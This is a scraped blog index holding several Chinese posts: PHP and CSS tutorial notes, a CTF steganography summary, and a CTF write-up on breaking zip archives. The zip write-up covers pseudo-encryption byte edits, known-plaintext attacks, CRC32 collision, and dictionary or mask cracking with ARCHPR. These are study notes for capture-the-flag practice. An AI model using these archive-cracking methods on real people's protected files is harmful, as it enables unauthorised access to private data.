注意点：1)表达式的值最好是整形或者字符串！2)不要忘记break语句！来跳出switch语句！每个case语句后面都加上break3)如果某个case语句后面并没有接语句块，那么就说明这个语句块的内容是同下！4)case后面的语句块是不需要&#123;&#125;括起来的 3、循环执行计算机最擅长的功能之一就是按照规定的条件，重复执行某些操作，这是程序设计中最能发挥计算机特长的程序结构。1.while语句 while(表达式)&#123; 各种语句....&#125; 当表达式的值为true,那么就执行下面的语句块， 当语句块执行结束之后，继续返回上面来判断表达式的值是true还是false，如果还是true，那么就继续执行语句块。直到这个表达式的值为false，那么这个while语句就执行结束了！ 例： $i=0;while($i&lt;10)&#123;echo $i++.'&lt;br /&gt;';&#125;echo '执行结束了！'; 2.do…while语句 do&#123; 各种语句&#125;while(表达式); 与while语句区别就是，do while语句至少会执行一次！3.for语句 for(表达式a;表达式b;表达式c)&#123; 各种语句&#125; 表达式a:会放一些初始化话的语句,$i=0,放多个表达式,中间用,隔开表达式b：会放一些用来判断true或者false的表达式！，也可以放多个表达式，中间用,隔开表达c：会放一些对初始化的变量进行自增的语句！放多个表达式,中间用,隔开 表达式a表达式b 如果是true语句块表达式c表达式b 4、特殊的流程控制语句1.break语句作用：用于switch语句，for，while，do…while，foreach，用于中断这些语句！ 后面可以接上一个数字来表示跳出几层循环！默认不加就是跳出当前循环语句！2.continue语句作用：只能用在循环语句，跳出本次循环，并不是结束整个循环语句！3.exit()语句作用：结束当前整个程序的执行！和die()作用一样 三、函数1、自定义函数function 函数名([形式参数1,形式参数2,....形式参数n])&#123; //各种PHP代码.... //...... return 表达式;//也可以不返回，如果不写那么默认返回null&#125; 函数的调用: 函数的调用需要遵循定义函数的时候写的规则，一一对应，将具体实参传给定义函数时候写的形参调用函数之后执行的过程是相对独立的，互补干扰，默认没有联系执行完毕返回调用的位置继续向下执行return 函数的返回值：返回给调用者,默认返回null 如： &lt;?php function test($a,$b)&#123;//形参 echo $a+$b;&#125;test(2,4);?&gt; 2、PHP变量的范围1.局部变量 function test()&#123; $a=1;//局部变量$a，仅在函数内部有效&#125;echo $a;//输出$a不存在 2.全局变量 $i=10;//全局变量（外部变量）define('MY_NAME','xiaoming');function test()&#123; echo MY_NAME; global $i;//声明$i全局变量,函数内部才可以使用$i echo $i; $a=1;&#125;//include ''引入test(); 3.静态变量 function test()&#123; static $a=10;//静态变量$a,初始化静态变量,仅在第一次调用的时候执行 echo ++$a;//当第二次执行这个函数的时候$a这个变量依然存在并且里面的值也依然存在&#125; test(); echo '&lt;br /&gt;'; test(); echo '&lt;br /&gt;'; test(); echo '&lt;br /&gt;'; 3、参数的传递1.按值传递参数传递参数的时候默认使用对形参的操作，根本不是影响到实参(变量)的值，两者相当于没有联系!2.按引用传递参数 按引用传递参数，相当于形参和实参指的是同一个人，只是名字不一样，对于形参的操作会直接影响到实参（变量）;3.函数的默认参数可以给形参设置默认值，设置方法:直接赋值给形参加默认值的时候是重右往左加的，右边的必须有，才能够给左边的加 例: &lt;?phpfunction test($a,$b=100)&#123; echo $a+$b;&#125;test(200);?&gt; 4.可变长度参数列表PHP提供给我们的，可以直接使用 func_get_args();//返回全部参数func_get_arg();//返回第()参数,从0开始计数func_num_args();//返回所在自定义函数的个数 ​ 这三个函数可以使用在我们的自定义函数内部，能够返回给我们一些关于参数的信息! 4、可变函数（变量函数）直接把函数赋值给变量 例： function test()&#123; echo \"asdff\";&#125;$a='test';$a();echo $a; ​ 可变函数不能用于例如 echo，print，unset()，isset()，empty()，include，require 以及类似的语言结构。需要使用自己的包装函数来将这些结构用作可变函数 5、递归函数递归函数即在函数内部自己调用自己的函数。递归函数：(1)函数在被调用的执行过程中会在内存里面分配空间用于存储临时数据，那么函数在执行过程中默认之间时没有联系的（除了静态变量，按引用传，全局变量）。里面的变量默认都是局部变量，相互之间没有影响！(2)递归函数，在函数的内部需要有适时结束函数运行的条件！ 例： function test($a)&#123; echo $a.'&amp;nbsp;'; if($a&gt;0)&#123; test($a-1); &#125; else&#123; echo '-------'; &#125; echo $a.'&amp;nbsp;'; &#125;test(5); 执行结果： 查看网页源代码： 6、内部（内置）函数PHP提供许多现成的函数或者结构，可以在实际开发中直接使用。还有一些函数需要开启特定地 PHP 扩展模块，否则在使用它们的时候就会得到一个致命的“未定义函数”错误。常用的内置函数或扩展的函数，有这样的需求，才会去找对应的函数。 四、数组数组： 1、数组类型复合数据类型 2、数组创建方法一：变量名称[索引值]=数据;变量名称[]=数据;//不写索引值默认是 索引数组，从0开始 例： //$student[索引值]=具体的值//索引数组$student[0]=12;$student[1]='小明';$student[2]=true;$student[3]=32.8;//需要使用print_r()函数来输出数组的具体内容print_r($student);//var_dump($student); //$student[索引值]=具体的值//关联数组$student['age']=12;$student['name']='小明';$student['sex']=true;$student['grade']=32.8;//需要使用print_r()函数来输出数组的具体内容print_r($student);//var_dump($student); 方法二：变量名称=array( 索引值=&gt;数据, ……….); 例： $student=array(12,'小明',true,32.8);print_r($student);//var_dump($student); //还可以写成$student=array( 0=&gt;12, 1=&gt;'小明', 2=&gt; true, 3=&gt;32.8);print_r($student);//var_dump($student); 关联数组同上 数据里面还可放数组类型的数据，同一个数组中存储任何类型的数据多维数组：访问数值的方法变量名称[索引值][索引值]…. 例： //二维数组$student=array( 0=&gt;array(15,'小红',true,63.2), 1=&gt;array(16,'小明',true,70.3), 2=&gt;array(17,'小张',true,65.4));print_r($student);//var_dump($student); 3、数组的遍历遍历数组：每个都经历一遍(1）for循环 用的比较少，因为有缺陷 count(数组)返回数组里面数据的个数，还可以获取多维数组的个数 例： $student=array(12,'小明',true,32.8);echo count($student); (2）foreach语句来实现遍历数组的目的 foreach(数组变量 as 变量1)&#123; //每次循环执行的语句 变量1代表当前正在经历（访问）的数据&#125; 例： $student=array(12,'小明',true,32.8);foreach($student as $value)&#123; echo $value.'&lt;br /&gt;';&#125; foreach(数组变量 as 变量1=&gt;变量2)&#123; //每次循环执行的语句 变量1代表当前正在经历（访问）的数据的索引值 变量1代表当前正在经历（访问）的数据&#125; 例： $student=array(12,'小明',true,32.8);foreach($student as $key=&gt;$value)&#123; echo $key.'-'.$value.'&lt;br /&gt;';&#125; 规则多维数组的遍历： $arr=array( 0=&gt;array(15,'小红',true,63.2), 1=&gt;array(16,'小明',true,70.3), 2=&gt;array(17,'小张',true,65.4));foreach($arr as $brr)&#123; foreach($brr as $val)&#123; echo $val.'&lt;br /&gt;'; &#125;&#125; 不规则多维数组的遍历，可以用递归思想解决 4、预定义超全局数组变量已经定义过（存在）的变量(存放的数据的类型是数组)超全局：超级全局变量，作用域（有效区域） 传递数据（提交数据）给服务器端主要两种方式 1.get方式比如： ?参数名=参数值&amp;参数名=参数值...... http://localhost/php/index.php?参数名=参数值在服务器端（请求的php文件这边）可以通过$_GET来获取到$_GET索引值为参数名，索引值对应的数据就是参数值 &lt;?phpvar_dump($_GET);?&gt; 缺点：不太安全 2.post方式比如表单 post发送过来的！可以通过$_POST来获取到! 5、处理数组的相关函数(1)array_count_values统计数组中所有值出现的次数 $array = array(1, \"hello\", 1, \"world\", \"hello\");print_r(array_count_values($array));//函数返回数组类型的数据//print_r($array);//原来的数组不会受到任何影响 (2)array_key_exists检查给定的键名或索引是否存在于数组中 $search_array = array('first' =&gt; 1, 'second' =&gt; 4);var_dump(array_key_exists('second',$search_array)); (3)array_search在数组中搜索给定的值，如果成功则返回相应的键名 $array = array(0 =&gt; 'blue', 1 =&gt; 'red', 2 =&gt; 'green', 3 =&gt; 'red',4=&gt;15);var_dump(array_search('15', $array,true)); (4)count计算数组中的单元数目或对象中的属性个数 $array = array(0 =&gt; 'blue', 1 =&gt; 'red', 2 =&gt; 'green', 3 =&gt; 'red',4=&gt;15);var_dump(count($array)); (5)in_array检查数组中是否存在某个值 $os = array(\"Mac\", \"NT\", \"Irix\", \"Linux\");var_dump(in_array('Mac', $os)); (6)list把数组中的值赋给一些变量 $arr=array(60,80,100);list($sunshengli,$xiaohong,$xiaoming)=array(60,80,100);echo $sunshengli; (7)asort对数组进行排序并保持索引关系 $students=array( 'xiaoming'=&gt;60, 'lilei'=&gt;80, 'lihua'=&gt;100, 'zhangsan'=&gt;90);asort($students);print_r($students); 直接对数组里面的数据进行排序，第二个参数SORT_REGULAR - 正常比较单元（不改变类型）SORT_NUMERIC - 单元被作为数字来比较SORT_STRING - 单元被作为字符串来比较SORT_LOCALE_STRING - 根据当前的区域（locale）设置来把单元当作字符串比较。(8)array_filter用回调函数过滤数组中的单元 function odd($var)&#123; return($var % 2 == 1);&#125;function even($var)&#123; return($var % 2 == 0);&#125;$array1 = array(\"a\"=&gt;1, \"b\"=&gt;2, \"c\"=&gt;3, \"d\"=&gt;4, \"e\"=&gt;5);$array2 = array(6, 7, 8, 9, 10, 11, 12);echo \"Odd :\\n\";print_r(array_filter($array1, \"odd\"));echo \"Even:\\n\";print_r(array_filter($array2, \"even\")); ​ 所有数组函数 五、字符串处理1、去除空格或其他字符函数trim $str=' abc ';var_dump($str);var_dump(trim($str));//去除左右两边空白$str='abcabcdefac';var_dump($str);var_dump(trim($str,'bac'));//如果要去除多个字符可以连着写//trim去除两边//ltrim去除左边//rtrim去除右边 2、大小写转换函数$str='test';var_dump($str);$str1=strtoupper($str);var_dump($str); $str='TeSt';var_dump($str);var_dump(strtolower($str));var_dump($str); 3、字符串查找函数1.substr_count统计某字符串出现的次数 $str='testteste';var_dump(substr_count($str,'te'));//统计某字符串出现的次数，不会计算重叠字符串,如：abcabcabc -&gt;1 $str='testteste';var_dump(substr_count($str,'te',1,8));//不能超出字符串,从第二个到第九个查找 2.strpos查找某字符串首次出现的位置 $str='testteste';var_dump(strpos($str, 't1'));if(strpos($str, 't')===false)&#123; echo '没找到！';&#125;else&#123; echo '找到啦!';&#125;$str='testteste';var_dump(strpos($str, 't',1));//从第二个开始查找 3.strstr查找从某字符出现的位置到结尾的字符串 $str='testteste';var_dump($str);var_dump(strstr($str,'s'));var_dump(strstr($str,'s',true));//查找从某字符出现的位置到开始的字符串 4、字符串替换函数str_replace $str='testestab';var_dump($str);var_dump(str_replace('t','T',$str)); $str=array( 'abc123abc', '123abcabc', 'abcab123c');var_dump($str);$str1=str_replace(array('1','2','3'),array('一','二','三'),$str,$count);echo $count;//替换发生的次数var_dump($str1); 5、与html标签相关的函数1.htmlspecialchars把预定义字符转换成html实体 $str=&lt;&lt;&lt;START&lt;p style=\"color:red;font-size:128px;\"&gt;我去问让他&lt;/p&gt;\"START;echo $str;echo \"\\n\";echo htmlspecialchars($str);//把预定义字符转换成html实体 2.strip_tags从字符串中去除HTML和PHP标记 $str=&lt;&lt;&lt;START&lt;p style=\"color:red;font-size:128px;\"&gt;单位确定为取得完全&lt;/p&gt;&lt;div style=\"color:red;\"&gt;我的名字&lt;/div&gt;START;//echo $str;//echo \"\\n\";echo strip_tags($str,\"&lt;div&gt;&lt;p&gt;\"); 6、字符串截取函数substr $str='qwzftest';echo substr($str,3,2);//从第四个开始截，截两个//不填2默认截到结尾$str='test';echo substr($str,-3,2);//-3是从结尾开始数到倒数第三个 7、字符串分隔函数1.explode $str='test,test1,test2,test3';var_dump(explode(',',$str,2));//默认有几个“，”分隔几段。2表示分隔两段 2.str_split $str='test';var_dump(str_split($str,3));//默认每段一个字符，3表示每段3个字符","categories":[{"name":"Web","slug":"Web","permalink":"https://qwzf.gitee.io/blog/categories/Web/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://qwzf.gitee.io/blog/tags/Web/"},{"name":"开发","slug":"开发","permalink":"https://qwzf.gitee.io/blog/tags/开发/"},{"name":"PHP","slug":"PHP","permalink":"https://qwzf.gitee.io/blog/tags/PHP/"}],"author":"qwzf"},{"title":"MISC-隐写的总结","slug":"MISC-隐写的总结","date":"2019-04-06T10:33:32.078Z","updated":"2020-01-11T16:37:47.970Z","comments":true,"path":"2019/04/06/MISC-隐写的总结/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/04/06/MISC-隐写的总结/","excerpt":"","text":"这周做了几个隐写题，感觉非常有趣。看了许多大佬的博客，最终才完整的做完这些隐写题。为了加深自己的理解，还是有必要总结一下的。毕竟学以致用，学以会用！！ 解隐写题的一般思路: 首先看看图片是不是图种 然后使用binwalker分析图片,如果是有文件合成,分离 有时信息藏在备注中 工具stegsolve 编程分析 1、LSB隐写简介：LSB(英文 least significant bit)即最低有效位。LSB加密是信息隐藏中最基本的方法。由于人们识别声音或图片的能力有限，因此我们稍微改动信息的某一位是不会影响我们识别声音或图片的。 用法：通常来说LSB加密用在无损压缩的数据格式文件中，例如图像中的png格式、bmp格式和音频的wav格式。由于这三种格式未对源数据进行有损压缩，因此可以将信息隐藏起来。 对于图像文件LSB的特征很明显，通常将信息隐藏在某一个颜色通道中。我们可以查看图片的每个像素点的RGB值，或者使用stegsolve工具进行查看。 stegsolve工具下载 需要下载Java配置Java环境或者只下载Java，用Java打开stegsolve.jar文件 由于图像是由像素构成的，每个像素有8位(对于BMP图像来说),通常最后一位的变化，通过肉眼是无法察觉的 例1： 下载题目文件并解压后，发现一个名叫taqing.png的图片。因为题目是“LSB”，所以这张图片应该进行了LSB隐写。 用stegsolve打开taqing.png,并选择Analyse的Data Extract 把Red、Green、Blue的最低有效位0那一列打对勾（原因），并点击Preview，在最上面会发现flag了！！ flag是flag{have a good time!} 例2： 下载题目文件并解压后，发现一个名叫LSBencode.png的图片。因为题目是“LSB2”，所以这张图片也应该进行了LSB隐写。 用stegsolve打开LSBencode.png,并选择Analyse的Data Extract 把Red、Green、Blue的最低有效位0那一列打对勾（原因），并点击Preview，在最上面会发现flag了！！ 2、盲水印由题目可知，此题为盲水印，所以使用bwm脚本（python2）另一个脚本decode脚本。 bwm脚本 decode脚本 并且这两个不完全一样，用其中一个加上水印，用另一个解不开，所以还是都存起来吧。 运行脚本发现没有cv2这个模块，使用下面的命令安装cv2pip install opencv-python 接下来： 如果是bwm脚本运行 python bwm.py decode 1.png 2.png flag.png 其中1.png和2.png是解压所得图片，flag.png是所分离出来的水印。 如果是decode脚本运行 python decode.py --original 1.png --image 2.png --result flag.png。 其中1.png和2.png是解压所得图片，flag.png是所分离出来的水印。 另外推荐一个加盲水印和分离盲水印的神器：WaterMarkH下载 例： 下载题目文件并解压后，发现两张图片：text.jpg和text2.jpg。因为题目是“盲水印”，所以这道题应该是找盲水印。 把文件后缀改成.png格式，结果我试了两个脚本都没有找到盲水印，我以为是因为python版本的问题，然而并不是。。。所以这道题应该是使用WaterMarkH加的盲水印，所以直接使用这个工具就找到了盲水印 3、双图例： 下载题目文件，解压出来就是双图first.png和second.png，先用stegslove打开first.png保存反色图片为1.bmp 然后打开保存的反色图片1.bmp，选择stegslove的image combiner结合second.png，保存结合的图片为solved.bmp 然后打开保存的结合图片solved.bmp，再用stegslove对二维码变化一下，得到三张二维码 扫描结果是DES 6XaMMbM7 和一长串字符，很显然是des加密，秘钥是6XaMMbM7，然后对长串字符进行DES解密，即可得到flag！！ 4、画图例： 根据题目可知，此题是画图 用winhex打开发现图片后面有很多的数据 复制下来保存为1.txt文件用notepad++转换一下编码 这就是坐标了,这样来画图吧 转换成gnuplot能识别的格式 保存1.txt文件，下载gnuplot画图工具，把1.txt文件和画图工具放入同一路径，打开gnuplot.exe,输入命令plot &quot;1.txt&quot;进行画图 扫描二维码，即可得到flag！！ 隐写题总结之后，果然让我对此更加理解了，开心！！！","categories":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.gitee.io/blog/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.gitee.io/blog/tags/CTF/"},{"name":"MISC","slug":"MISC","permalink":"https://qwzf.gitee.io/blog/tags/MISC/"},{"name":"隐写","slug":"隐写","permalink":"https://qwzf.gitee.io/blog/tags/隐写/"}],"author":"qwzf"},{"title":"MISC-zip压缩包的总结","slug":"MISC-zip压缩包的总结","date":"2019-04-05T16:21:56.744Z","updated":"2020-01-11T16:38:08.629Z","comments":true,"path":"2019/04/06/MISC-zip压缩包的总结/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/04/06/MISC-zip压缩包的总结/","excerpt":"","text":"做了那么多的MISC压缩包的CTF题，是时候总结一下经验了。手撕压缩包走起！ 1、伪加密zip中有一位是标记文件是否加密的，如果更改一个未加密zip包的加密标记位，那么在打开压缩包时就会提示该文件是加密的。 重点部分把504B0304后的第3、4个byte改成0000还有把504B0102后的第5、6个byte改成0000即可破解伪加密。 识别真假加密无加密压缩源文件数据区的全局加密应当为00 00且压缩源文件目录区的全局方式位标记应当为00 00假加密压缩源文件数据区的全局加密应当为00 00且压缩源文件目录区的全局方式位标记应当为09 00真加密压缩源文件数据区的全局加密应当为09 00 例： 根据题目，这可能是一道伪加密题。把压缩包文件用winrar打开，看出来b.png进行了伪加密 把Blog的zip压缩包放进winhex,在最上面没发现伪加密标志位，所以我在最下面发现 把b.png的504B0102后第五位09改成00，即可破解伪加密，解压即可在b.png中得到flag！！ 2、明文攻击明文攻击是一种较为高效的攻击手段，大致原理是当不知道一个zip的密码，但是有zip中的一个已知文件（文件大小要大于12Byte）时，因为同一个zip压缩包里的所有文件都是使用同一个加密密钥来加密的，所以可以用已知文件来找加密密钥，利用密钥来解锁其他加密文件。 推荐一个工具:APCHPR (可进行爆破/明文/字典/掩码攻击) 例: 根据题目看出来这道题可能是明文攻击，下载之后得到zip压缩包，用winrar打开 在zip文件里有个未加密的 提示.txt文件，在blingbling.zip有个加密的 提示.txt文件。所以这应该是明文攻击。把未加密的 提示.txt文件压缩成zip压缩包 当作明文。对blingbling.zip进行明文攻击，如下: 得到空白文档???的口令密码: 打开空白文档???，发现真的是空白的，想吐血。不过查了查百度发现，打开word文件，选择“选项”，然后选择“显示” 在隐藏文字和打印隐藏文件前打对勾，然后确定，然后打开空白文档???，就能看到flag了！！ 3、crc32碰撞CRC32:CRC本身是“冗余校验码”的意思，CRC32则表示会产生一个32bit（8位十六进制数）的校验值。** 在产生CRC32时，源数据块的每一位都参与了运算，因此即使数据块中只有一位发生改变也会得到不同的CRC32值，利用这个原理我们可以直接爆破出加密文件的内容 例: 根据题目可知，这道题可能是crc32碰撞。下载该压缩包，用winrar打开 会发现4个加密的txt文件，有三个大小为6的，一个存放flag大小为102的。crc32碰撞，碰撞文件的大小一般不大于6，大于6的一般碰撞不出来。且位于同一压缩包的文件，文件密码相同。所以对1.txt 2.txt 3.txt进行crc32碰撞 还有一款很好用的6位的CRC32爆破 附上神器：https://github.com/theonlypwner/crc32具体使用方法： python crc32.py reverse 你的crc32密文 密文记得加上0x变成16进制，三个txt文件碰撞结果如下 1.txt 2.txt 3.txt 在碰撞的内容中，找有意义的字符。1.txt中”you_ar“ 2.txt中“e_the_“ 3.txt中未发现有意义的字符。做到这一步，再次想吐血。还好我用notepad++打开碰撞脚本，发现一组特殊之处 想着是不是因为脚本里缺少特殊字符，而3.txt里有特殊字符。所以碰撞不出3.txt的内容。加上特殊字符后，碰撞结果如下 找到3.txt中的有意义的字符了，好开心！！！3.txt中的有意义字符“best!!”，结合1.txt的“you_ar“ 2.txt的”e_the_“得到flag.txt的密码：“you_are_the_best!!“，输入密码打开后发现 很明显是Base64加密的，所以Base64解密，得到 看起来解密结果符合url编码，所以url解码，得到最终flag如下： 4、爆破/字典/掩码攻击把这三种归位一类是因为这三种方法在本质上都是逐个尝试，只不过待选密码的集合不同 爆破：顾名思义，逐个尝试选定集合中可以组成的所有密码，知道遇到正确密码 字典：字典攻击的效率比爆破稍高，因为字典中存储了常用的密码，因此就避免了爆破时把时间浪费在脸滚键盘类的密码上 掩码攻击：如果已知密码的某几位，如已知6位密码的第3位是a，那么可以构造 ??a??? 进行掩码攻击，掩码攻击的原理相当于构造了第3位为a的字典，因此掩码攻击的效率也比爆破高出不少 例： 用winrar打开发现一个加密文件 所以应该要暴力破解，把下载的压缩包放进ARCHPR(爆破工具)里，选择字典攻击(字典攻击比暴力攻击用时少)， 得出文件密码口令 输入密码，解压文件，得到一个文件夹。然后文件夹里有好几个文件夹，所以开启找可疑之处的历程 最终，我发现有个地方比较可疑 看着比较像Base16加密，所以进行Base16解密，得到flag 5、杂类例1: 很明显，这个题并没有给出有效提示(只给了提交格式)。下载后，用winrar打开发现一个zip.txt文件，打开后 根据504B0304可以看出这应该是一个压缩包的16进制编码，然后查询一下压缩包16进制编码格式，把不符合16进制编码的改成对应的16进制编码。改完后，把16进制编码粘贴在winhex里进行对压缩包的恢复 注意选择16进制粘贴格式 然后保存，用winrar打开恢复后的压缩包，结果发现一个flag.txt文件竟然是加密的，再次想吐血! 也没给什么提示，想着是不是伪加密，所以我用winhex打开恢复后的压缩包，发现果然是伪加密 把01改成00后保存，再次用winrar打开，发现flag.txt变成了未加密，开心！找到flag了！！ 例2: 这个题给了提示，一个公式f(x)=(x-n)%26+97，看着有点像凯撒公式。下载后，用winrar打开压缩包，进入“皮”文件夹发现两个txt文件 打开两个txt文件 key.txt应该就是凯撒加密的密文了，而提示.txt可能是密钥。然后，我开始理解题目提示的凯撒公式f(x)=(x-n)%26+97，我理解这是个加密公式，f(x)是密钥，x是明文，n是密文。然后我写出对应的解密公式str=((c1-97)+(key-97))%26+97，str是明文，c1是密文，key是密钥。由于写这篇blog时，我还不会写python脚本，于是我写了个c语言的 #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; int j; char key[20]; char c1[20]=\"yrsimmpzrbkcokd\",c2[20]=\"zokkhuapoloaeku\",c3[20]=\"xloobshxdbamnqn\",str1[20],str2[20],str3[20]; for(j=1;;j++) &#123; printf(\"请输入密钥:\");scanf(\"%s\",key); printf(\"密文1:%s\\n密文2:%s\\n密文3:%s\\n\",c1,c2,c3); //printf(\"密文1:%s\",c1);//scanf(\"%s\",c1); //printf(\"密文2:%s\",c2);//scanf(\"%s\",c2); // printf(\"密文3:%s\",c3);//scanf(\"%s\",c3); printf(\"明文1:\"); for(int i=0;i&lt;strlen(key);i++) &#123; str1[i]=(c1[i]-97+key[i]-97)%26+97; printf(\"%c\",str1[i]); &#125; printf(\"\\n\"); printf(\"明文2:\"); for(int i=0;i&lt;strlen(key);i++) &#123; str2[i]=(c2[i]-97+key[i]-97)%26+97; printf(\"%c\",str2[i]); &#125; printf(\"\\n\"); printf(\"明文3:\"); for(int i=0;i&lt;strlen(key);i++) &#123; str3[i]=(c3[i]-97+key[i]-97)%26+97; printf(\"%c\",str3[i]); &#125; printf(\"\\n\\n\"); printf(\"a b c d e f g h i j k l m n o p q r s t u v w x y z\"); printf(\"\\n\"); printf(\"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26\"); printf(\"\\n\"); printf(\"26 25 24 23 22 21 20 19 18 17 16 15 14 13 12 11 10 9 8 7 6 5 4 3 2 1\"); printf(\"\\n\\n\"); &#125; return 0;&#125; 输入第一个密钥，运行结果如下 然后想到明文3前四个字母应该就是f、l、a、g，而密文3前四个字母是x、l、o、o。所以第二个密钥应该是f(x)=(l-l)%26+97=a; 第三个密钥应该是f(x)=(a-o)%26+97=m;第四个密钥应该是f(x)=(g-o)%26+97=s; 然后明文1第五个字母应该是t，密文1第五个字母是m。第五个密钥应该是f(x)=(t-m)%26+97=g+1=h; 注意： 明文-密文=正值，从前往后数，密钥=正值(即英文字母序号)+1； 明文-密文=负值，从后往前数，密钥=负值的绝对值(即26-英文字母序号)； 找到密钥序号对应的字母 明文-密文=零，密钥=a； 不断找寻密钥、明文、密文间的规则，最后得出全部密钥和最终flag 下面也有个别人写好得python脚本，果然写python脚本才更简洁、更容易。我要努力学python了！！ 以上便是我做CTF压缩包类型题的总结，总结许多收获也许多。小白进阶ing!!!","categories":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.gitee.io/blog/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.gitee.io/blog/tags/CTF/"},{"name":"MISC","slug":"MISC","permalink":"https://qwzf.gitee.io/blog/tags/MISC/"},{"name":"ZIP","slug":"ZIP","permalink":"https://qwzf.gitee.io/blog/tags/ZIP/"}],"author":"qwzf"},{"title":"Web前端-CSS篇","slug":"Web前端-CSS篇","date":"2019-03-30T11:39:32.075Z","updated":"2019-08-01T05:49:26.345Z","comments":true,"path":"2019/03/30/Web前端-CSS篇/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/03/30/Web前端-CSS篇/","excerpt":"","text":"学习CSS之后，感觉对Web前端又有了更深一步的理解。学习总结了许久，总算把学习笔记写完了，顿觉一阵轻松！！学习过程中，虽然有些枯燥，但最终的收获却很多很多。下面便是我的CSS的学习笔记，自我认为还行~~ 一、CSS定义和三种用法1、CSS:层叠样式表负责页面内容的样式 标签的属性产生的问题： 浏览器麻烦，需要改很多 对开发人员：复杂，难维护 解决方法： 通过标签选择器，样式属性选择标签 可复用 html放标签 css放样式 2、CSS三种用法：第一种用法：内联样式 第二种用法：内部样式 第三种用法：外部样式 二、CSS语法1、选择器与内容/* div:选择器 &#123;&#125;内容：声明 */ /*注释*/div &#123; color: yellow; width: 200px; height: 200; background: green; &#125; 2、颜色1.rgb色彩模式 R 红色 浅~深 0~255 G 绿色 b 蓝色 用法一： div &#123; color: rgb(240,0,0);&#125; 用法二： div &#123; color: rgb(100%,20%,0%);&#125; 2.名称 red yellow blue red… div &#123; color: rgb(100%,20%,0%);&#125; 3.十六进制 0~9 A~B R 红色 浅~深 0~255 225写成ff (ff即15*15) #ff0000可以简写成#f00 G 绿色 b 蓝色 div &#123; color: #ff0000; color: #f00;&#125; 三、CSS选择器大括号{}前的，如：div{} 选择器是div 作用：通过选择器找到对应的html的元素，并把选择器的样式传给元素 选择器的分类： 基本选择器、组合选择器、属性选择器、伪元素选择器 1、基本选择器1、通配符选择器 *&#123; border: 1px solid blue /*给所有元素加个外边框*/&#125; 2、标签div选择器 div&#123; border: 1px solid blue /*给div标签加个外边框*/&#125; 3、id选择器 html中：&lt;div id=\"txt\"&gt;ppp&lt;/div&gt;#txt&#123; /*#txt，*省略/ font-size: 50px; /*font-size字体大小*/&#125; id具有唯一性 4、class类型选择器 html中：&lt;div class=\"txt txt1\"&gt;ppp&lt;/div&gt; .txt&#123; font-size: 50px;&#125;.txt1&#123; /* div.txt1&#123;color: #ff0000;&#125; 作用于div标签下的class=\"txt1\" color: #ff0000;&#125; class不具有唯一性 比较常用 2、组合选择器把基本选择器 通过特殊符号串在一起 分组选择器 &lt;div&gt;div1&lt;/div&gt;&lt;p&gt;p1&lt;/p&gt; div,p&#123; background: green; color: red;&#125;p&#123; /*相当于background: green; color: red;*/ font-size: 60px;&#125; 嵌套选择器 空格隔开,嵌套在div里面的p才能生效 div p&#123; background: green; color: red; font-size: 60px;&#125; 子选择器 1.父标签必须是div才能生效 div&gt;p&#123; background: green; color: red; font-size: 60px;&#125; 2.相邻的 同级别的选择器 &lt;p&gt;&lt;/p&gt; div+p&#123; background: green; color: red; font-size: 60px;&#125; 3、属性选择器基本s[属性] &lt;p title=\"txt\"&gt;p1&lt;/p&gt; p[title=txt]&#123; /*p标签有title属性且值相同的才能生效*/ background: green; color: red; font-size: 60px&#125; p[title~=txt]&#123; /*p标签有title属性且值有txt的(且其它字符在html里与txt以空格隔开)才能生效*/ background: green; color: red; font-size: 60px&#125; p[title^=txt]&#123; /*p标签有title属性且值以txt开始的才能生效*/ background: green; color: red; font-size: 60px&#125; &lt;p title=\"txt yy\"&gt;p1&lt;/p&gt; p[title$=yy]&#123; /*p标签有title属性且值以yy结束的才能生效*/ background: green; color: red; font-size: 60px&#125; 4、伪元素选择器伪元素：自动加的、看不到的元素 如：开始before 结束after &lt;p title=\"txt\"&gt; &lt;!--&lt;before&gt;--&gt; p1 &lt;!--&lt;after&gt;--&gt;&lt;/p&gt; p::before&#123; content:\"before\"; /*content修改内容*/ font-size: 20px;&#125;p::after&#123; content:\"after\"; /*content修改内容*/ font-size: 120px;&#125;p &#123; background: green; color: red; font-size: 60px&#125; 块元素 第一个字母：first-letter 第一行：first-line 伪类 选择器 根据状态来改变 四、CSS原理原则 优先原则：后解析的覆盖先解析的内容 继承原则：嵌套里面标签拥有外部标签某些样式 子元素可以继承父元素的属性 ​ 1.与文字有关的文本、样式可以被继承 ​ 2.块级元素，宽度不被设置的 继承父元素的宽 高由内容决定 优先原则：同一个选择器，从上往下执行 ​ 同一类型选择器，从上往下执行 ​ 不同类型的选择器，先解析低优先级的，再解析高优先级的 *&lt;div&lt;class&lt;id 外部样式和内部样式: 外部样式和内部样式合并之后 一起解析 ​ 先外部样式后内部样式 内联样式: 外部和内部样式解析完后，才解析内联样式 加了important字段的最后执行: div&#123; background-color: red!important; /*可以测试用*/&#125; 五、背景body &#123; background-color: red；/*颜色*/ background-image: url('图片地址')/*图片复制平铺完整个页面*/ background-repeat: repeat-x;/*沿着x轴平铺/ background-repeat: no-repeat;/*不平铺，就一张图片*/ background-position: 100px 100px;/*50% 0%;*//*x轴 y轴*//*图片移动*/ /*x:left center(50%) right y:top(0%) center(50%) bottom*/ background-attachment: fixed/*固定背景*/ /*可简写成background: color image repeat attachment;*/ background: red url('图片地址') repeat-x fixed;&#125; 六、文本/*字符间距*/letter-spacing: 0px;/*空格的距离*/word-spacing:0px; direction: ltr; /*left to right文本从左到右排列*/ text-decoration: none;/*默认*/text-decoration: line-through;/*一条线中间穿过*/text-decoration: overline;/*一条线上方穿过*/text-decoration: underline;/*一条线下方穿过*/ /*对齐方式*/text-align: center(居中) left(左) right(右) justify(两端)可以加个宽高和颜色等width:200px;height:200px; /*缩进*/text-indent: 50px; /*英文字母大小写*/text-transform: uppercase lowercase capitalize(首字母大写) /*取消换行*/white-space: nowrap;/*隐藏部分文本内容*/overflow: hidden;/*加省略号*/text-overflow: ellipsis; /*图片和文字的搭配*/img&#123; weight:200px; 